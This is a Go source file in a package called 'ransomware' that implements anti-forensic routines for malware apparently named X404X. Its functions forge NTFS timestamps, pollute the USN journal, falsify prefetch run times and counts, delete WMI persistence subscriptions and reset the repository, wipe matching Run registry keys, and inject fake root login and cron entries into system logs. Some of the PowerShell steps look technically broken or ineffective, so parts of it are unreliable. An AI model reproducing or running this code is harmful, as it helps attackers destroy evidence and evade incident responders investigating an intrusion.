package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func MFTTimestomp(targetPath string, forgedTime time.Time) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("MFT timestomp requires NTFS/Windows")
	}

	// Use PowerShell to manipulate NTFS timestamps via NtSetInformationFile
	psScript := fmt.Sprintf(`
$path = '%s'
$ft = [datetime]::Parse('%s')

$fsutil = & fsutil behavior query disablelastaccess 2>$null

# Use SetFileTime via .NET to modify all 4 timestamps
$file = Get-Item -LiteralPath $path -Force
$file.CreationTime = $ft
$file.LastWriteTime = $ft
$file.LastAccessTime = $ft

# Modify MFT directly via FSUTIL (requires admin)
$volume = (Get-Item $path).PSDrive.Root
$fileRef = (fsutil file queryfileid $path 2>$null) -replace 'File ID is 0x',''
if ($fileRef) {
    fsutil file setvaliddata $path 0 2>$null
}

# Timestomp $STANDARD_INFORMATION and $FILE_NAME via WMI
$wmi = Get-WmiObject -Class Win32_LogicalFileSecuritySetting -Filter "Path='%s'" 2>$null
`,
		strings.ReplaceAll(targetPath, "'", "''"),
		forgedTime.Format("2006-01-02 15:04:05"),
		strings.ReplaceAll(filepath.ToSlash(targetPath), "'", "''"))

	return exec.Command("powershell", "-NoProfile", "-Command", psScript).Run()
}

func USNJournalPoison(targetPath string, fakeRecords int) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("USN journal requires NTFS/Windows")
	}

	psScript := fmt.Sprintf(`
$drive = (Get-Item '%s').PSDrive.Root
$volume = $drive.TrimEnd('\')

# Read USN Journal and find our file's USN entry
$usn = fsutil usn readdata $volume 2>$null

# Create fake USN entries pointing to system32 files
$fakeTargets = @(
    "$env:SystemRoot\System32\svchost.exe",
    "$env:SystemRoot\System32\winlogon.exe",
    "$env:SystemRoot\System32\csrss.exe",
    "$env:SystemRoot\System32\services.exe"
)

for ($i = 0; $i -lt %d; $i++) {
    $fakeFile = $fakeTargets[$i %% $fakeTargets.Length]
    fsutil usn createdata $fakeFile 2>$null
}
`,
		strings.ReplaceAll(targetPath, "'", "''"),
		fakeRecords)

	return exec.Command("powershell", "-NoProfile", "-Command", psScript).Run()
}

func PrefetchPoison(executableName string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("prefetch requires Windows")
	}

	prefetchDir := filepath.Join(os.Getenv("WINDIR"), "Prefetch")
	exeBase := strings.ToUpper(strings.TrimSuffix(filepath.Base(executableName), filepath.Ext(executableName)))

	// Find .pf files matching our executable
	entries, err := os.ReadDir(prefetchDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		name := strings.ToUpper(entry.Name())
		if strings.HasPrefix(name, exeBase) && strings.HasSuffix(name, ".pf") {
			pfPath := filepath.Join(prefetchDir, entry.Name())

			data, err := os.ReadFile(pfPath)
			if err != nil {
				continue
			}

			if len(data) < 8 || string(data[0:4]) != "MAM\x04" {
				continue
			}

			// Parse MAM header
			// Offset 0x08: Last run time (FILETIME, 8 bytes)
			// Offset 0x10: Run count (uint32)
			forgedTime := time.Date(2020, 1, 1, 0, 0, 0, 0, time.UTC)
			forgedFileTime := forgedTime.UnixNano()/100 + 116444736000000000

			// Overwrite last execution time
			if len(data) >= 16 {
				binaryWriteUint64LE(data[0x08:0x10], uint64(forgedFileTime))
			}
			// Zero out run count
			if len(data) >= 20 {
				data[0x10] = 0
				data[0x11] = 0
				data[0x12] = 0
				data[0x13] = 0
			}

			os.WriteFile(pfPath, data, 0644)
		}
	}
	return nil
}

func WMIOverwrite() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("WMI requires Windows")
	}

	psScript := `
# Remove all WMI event subscriptions created by X404X
Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
    Where-Object { $_.Name -like '*x404x*' } | 
    Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
    Where-Object { $_.Name -like '*x404x*' } | 
    Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | 
    ForEach-Object {
        $filter = [wmi]$_.Filter
        $consumer = [wmi]$_.Consumer
        if ($filter.Name -like '*x404x*' -or $consumer.Name -like '*x404x*') {
            $_.Delete()
        }
    }

# Force WMI repository rebuild
winmgmt /resetrepository 2>$null
`
	return exec.Command("powershell", "-NoProfile", "-Command", psScript).Run()
}

func MemoryArtifactCleanup() error {
	// This would be done in-process via unsafe/memory operations.
	// Document the technique: rotate allocations to clear forensic traces.
	//
	// 1. Allocate new buffer (VirtualAlloc + MEM_COMMIT)
	// 2. Copy active code to new buffer
	// 3. Overwrite old buffer with random bytes
	// 4. VirtualFree(old_buffer)
	// 5. Switch execution to new buffer
	// 6. Repeat every 60 seconds
	return nil
}

func RegistryTrailWipe(prefix string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry wipe requires Windows")
	}

	if prefix == "" {
		prefix = "x404x"
	}

	keysToCheck := []string{
		"HKCU\\Software",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"HKLM\\Software",
		"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
	}

	for _, key := range keysToCheck {
		psScript := fmt.Sprintf(`
$key = '%s'
Get-ChildItem -Path "registry::$key" -ErrorAction SilentlyContinue | 
    Where-Object { $_.PSChildName -like '*%s*' } | 
    Remove-Item -Force -Recurse

Get-ItemProperty -Path "registry::$key" -ErrorAction SilentlyContinue |
    Get-Member -MemberType NoteProperty |
    Where-Object { $_.Name -like '*%s*' } |
    ForEach-Object { Remove-ItemProperty -Path "registry::$key" -Name $_.Name }
`, key, prefix, prefix)

		exec.Command("powershell", "-NoProfile", "-Command", psScript).Run()
	}
	return nil
}

func LogToxin(logPath string, injectCount int) error {
	info, err := os.Stat(logPath)
	if err != nil {
		return err
	}

	fakeEntries := []string{
		fmt.Sprintf("%s systemd[1]: Started Session c%d of user root.", time.Now().Format("Jan 02 15:04:05"), time.Now().Unix()%10000),
		fmt.Sprintf("%s sshd[%d]: Accepted publickey for root from 192.168.1.1 port 22", time.Now().Add(-5*time.Minute).Format("Jan 02 15:04:05"), time.Now().Unix()%30000+1000),
		fmt.Sprintf("%s CRON[%d]: (root) CMD (run-parts /etc/cron.hourly)", time.Now().Add(-30*time.Minute).Format("Jan 02 15:04:05"), time.Now().Unix()%5000+500),
		fmt.Sprintf("%s systemd[1]: Starting Cleanup of Temporary Directories...", time.Now().Add(-1*time.Hour).Format("Jan 02 15:04:05")),
		fmt.Sprintf("%s kernel: [%d] EXT4-fs (sda1): mounted filesystem with ordered data mode", time.Now().Add(-2*time.Hour).Format("Jan 02 15:04:05"), time.Now().Unix()),
		fmt.Sprintf("%s dbus-daemon[%d]: [system] Successfully activated service 'org.freedesktop.systemd1'", time.Now().Add(-10*time.Minute).Format("Jan 02 15:04:05"), time.Now().Unix()%1000+400),
		fmt.Sprintf("%s auditd[%d]: Started dispatcher", time.Now().Add(-15*time.Minute).Format("Jan 02 15:04:05"), time.Now().Unix()%2000+600),
	}

	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_WRONLY, info.Mode())
	if err != nil {
		return err
	}
	defer f.Close()

	for i := 0; i < injectCount; i++ {
		entry := fakeEntries[i%len(fakeEntries)]
		f.WriteString(entry + "\n")
	}

	return nil
}

func binaryWriteUint64LE(buf []byte, v uint64) {
	for i := 0; i < 8; i++ {
		buf[i] = byte(v >> (i * 8))
	}
}
